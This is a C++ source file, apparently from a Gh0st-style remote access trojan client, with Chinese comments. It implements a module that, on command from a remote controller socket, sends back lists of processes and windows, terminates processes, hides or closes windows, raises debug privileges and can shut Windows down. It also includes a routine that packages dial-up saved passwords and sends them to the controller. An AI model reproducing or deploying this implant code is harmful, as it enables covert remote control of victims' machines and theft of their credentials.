// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#include "..\pch.h"
#include "SystemManager.h"
#include "Dialupass.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Psapi.lib")

#include "until.h"
#include <tchar.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CSystemManager::CSystemManager(CClientSocket *pClient, BYTE bHow) : CManager(pClient)
{
	m_caseSystemIs = bHow;
	if (m_caseSystemIs == COMMAND_SYSTEM)     //如果是获取进程
	{
		SendProcessList();
	}
	else if (m_caseSystemIs == COMMAND_WSLIST)   //如果是获取窗口
	{
		SendWindowsList();
	}
}

CSystemManager::~CSystemManager()
{

}
void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{

	SwitchInputDesktop();
	switch (lpBuffer[0])//这里是进程管理接收数据的函数了 判断是哪个命令
	{
	case COMMAND_PSLIST:				//发送进程列表
		SendProcessList();	
		break;
	case COMMAND_WSLIST:				//发送窗口列表
		SendWindowsList();
		break;
	case COMMAND_DIALUPASS:				//保留20200530
		break;
	case COMMAND_KILLPROCESS:			//关闭进程
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
	case COMMAND_WINDOW_CLOSE:			//关闭窗口
		CloseTheWindow(lpBuffer + 1);	
		break;
	case COMMAND_WINDOW_TEST:			//最大化最小化 隐藏窗口函
		ShowTheWindow(lpBuffer + 1);    
		break;
	default:
		break;
	}
}

void CSystemManager::SendProcessList()
{
	UINT	nRet = -1;

	//调用getProcessList得到当前进程的数据 --->lpBuffer
	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;
	
	//发送函数 父类函数send 将遍历到的进程数据发送
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendWindowsList()
{
	UINT	nRet = -1;
	//获取窗口列表数据
	LPBYTE	lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;

	//发送遍历到的窗口数据
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);	
}


//保留20200530
void CSystemManager::SendDialupassList()
{
	CDialupass	pass;

	int	nPacketLen = 0;
	int i = 0;
	for (i = 0; i < pass.GetMax(); i++)
	{
		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
			nPacketLen += lstrlen(pOneInfo->Get(j)) + 1;
	}

	nPacketLen += 1;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);
	
	DWORD	dwOffset = 1;

	for (i = 0; i < pass.GetMax(); i++)
	{

		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
		{
			int	nFieldLength = lstrlen(pOneInfo->Get(j)) + 1;
			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
			dwOffset += nFieldLength;
		}
	}

	lpBuffer[0] = TOKEN_DIALUPASS;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
	
}


//结束进程
void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	// 因为结束的可能不止是一个进程所以用循环
	for (int i = 0; i < nSize; i += 4)
	{
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + i));
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	// 稍稍Sleep下，防止出错
	Sleep(100);
	// 刷新进程列表
	SendProcessList();
	// 刷新窗口列表
	SendWindowsList();	
}

BOOL CSystemManager::DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)
{
	TCHAR            szDriveStr[500];
	TCHAR            szDrive[3];
	TCHAR            szDevName[100];
	INT                cchDevName;
	INT                i;

	//检查参数
	if (!pszDosPath || !pszNtPath)
		return FALSE;

	//获取本地磁盘字符串
	if (GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr))
	{
		for (i = 0; szDriveStr[i]; i += 4)
		{
			if (!lstrcmpi(&(szDriveStr[i]), "A:\\") || !lstrcmpi(&(szDriveStr[i]), "B:\\"))
				continue;

			szDrive[0] = szDriveStr[i];
			szDrive[1] = szDriveStr[i + 1];
			szDrive[2] = '\0';
			if (!QueryDosDevice(szDrive, szDevName, 100))//查询 Dos 设备名
				return FALSE;

			cchDevName = lstrlen(szDevName);
			if (_tcsnicmp(pszDosPath, szDevName, cchDevName) == 0)//命中
			{
				lstrcpy(pszNtPath, szDrive);//复制驱动器
				lstrcat(pszNtPath, pszDosPath + cchDevName);//复制路径

				return TRUE;
			}
		}
	}

	lstrcpy(pszNtPath, pszDosPath);

	return FALSE;
}

BOOL CSystemManager::GetProcessFullPath(DWORD dwPID, TCHAR pszFullPath[MAX_PATH])
{
	TCHAR        szImagePath[MAX_PATH];
	HANDLE        hProcess;
	if (!pszFullPath)
		return FALSE;

	pszFullPath[0] = '\0';
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, dwPID);
	if (!hProcess)
		return FALSE;

	if (!GetProcessImageFileName(hProcess, szImagePath, MAX_PATH))
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	if (!DosPathToNtPath(szImagePath, pszFullPath))
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	CloseHandle(hProcess);
	return TRUE;
}

LPBYTE CSystemManager::getProcessList()
{
	HANDLE			hSnapshot = NULL;	//快照句柄
	HANDLE			hProcess = NULL;	//进程句柄
	HMODULE			hModules = NULL;	//进程模块句柄
	PROCESSENTRY32	pe32 = {0};
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = {0};	//进程名称
	LPBYTE			lpBuffer = NULL;				//
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;

	//提取权限
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	//创建一个进程快照
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;
	
	pe32.dwSize = sizeof(PROCESSENTRY32);
	

	//分配一下缓冲区
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	
	//数据类型,与控制端共有的枚举类型，表示这是进程的类型数据
	lpBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;
	
	//得到第一个进程，调用失败就反回
	if(Process32First(hSnapshot, &pe32))
	{	  
		do
		{      
			//打开进程句柄
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{

				//strProcessName[0] = '\0';
				//枚举第一个模块句柄
				//EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				//这里有bug当没有权限的情况下无法获取到进程名称，所以发送过去的是上一个进程名称也米有做初始化0处理，
				//而且获取的进程路径不没有下面的方法全面，采用下面的GetProcessFullPath，所以注释掉了
				//获取自身名称
				//GetModuleFileNameEx(hProcess, hModules, strProcessName, sizeof(strProcessName));
				//获取进程名称
				GetProcessFullPath(pe32.th32ProcessID, strProcessName);

				// 此进程占用数据大小
				dwLength = sizeof(DWORD) + lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + 2;
				// 缓冲区太小，再重新分配下
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
				

				//三个memcpy就是向缓冲区里存放数据 数据结构是 进程ID+进程名+0+进程完整名+0
				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);	
				
				memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
				dwOffset += lstrlen(pe32.szExeFile) + 1;
				
				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
				dwOffset += lstrlen(strProcessName) + 1;
			}
		}
		while(Process32Next(hSnapshot, &pe32));//下一个进程
	}
	//用lpbuffer获得整个缓冲去 
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	DebugPrivilege(SE_DEBUG_NAME, FALSE); 
	CloseHandle(hSnapshot);
	return lpBuffer;	
}

//提权
bool CSystemManager::DebugPrivilege(const char *PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	
	CloseHandle(hToken);
	return bResult;	
}

void CSystemManager::ShutdownWindows( DWORD dwReason )
{
	DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
	ExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	
}

//窗口回调遍历所有窗口
bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	lpBuffer = *(LPBYTE *)lParam;
	
	char	strTitle[1024];
	memset(strTitle, 0, sizeof(strTitle));
	//获取传进来的窗口句柄的标题
	GetWindowText(hwnd, strTitle, sizeof(strTitle));
	//判断窗口是否可见，标题是否为空
	if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)
		return true;
	
	//如果指针为空的话申请一个堆
	//（该函数时循环的所以第二次进来就不是空的，用动态的LocalReAlloc改变堆大小实现数据都在一个堆上）
	if (lpBuffer == NULL)
		//第一次申请大小为1是因为第一字节为通知控制端标识
		lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
	
	dwLength = sizeof(DWORD) + lstrlen(strTitle) + 1;
	dwOffset = LocalSize(lpBuffer);
	
	//计算缓冲区大小
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	//获取窗口的创建者 + 两个memcpy数据结构为 创建者PID + hwnd + 窗口标题 + 0
	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy((lpBuffer + dwOffset), &hwnd, sizeof(DWORD));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, lstrlen(strTitle) + 1);
	
	*(LPBYTE *)lParam = lpBuffer;
	
	return true;
}


//获取窗口列表数据
LPBYTE CSystemManager::getWindowsList()
{
	LPBYTE	lpBuffer = NULL;

	//枚举屏幕上的所有的顶层窗口，轮流地将这些窗口的句柄传递给一个应用程序定义的回调函数。
	//EnumWindows会一直进行下去，直到枚举完所有的顶层窗口，或者回调函数返回了FALSE.
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);

	//数据头填充TOKEN_WSLIST主控端识别
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;	
}


//关闭窗口
void CSystemManager::CloseTheWindow(LPBYTE buf)
{
	DWORD hwnd;
	memcpy(&hwnd, buf, sizeof(DWORD));				//得到窗口句柄 
	::PostMessage((HWND__ *)hwnd, WM_CLOSE, 0, 0);	//向窗口发送关闭消息
}

//显示窗口
void CSystemManager::ShowTheWindow(LPBYTE buf)
{
	DWORD hwnd;
	DWORD dHow;
	memcpy((void*)&hwnd, buf, sizeof(DWORD));				//得到窗口句柄
	memcpy(&dHow, buf + sizeof(DWORD), sizeof(DWORD));		//得到窗口处理参数
	ShowWindow((HWND__ *)hwnd, dHow);
}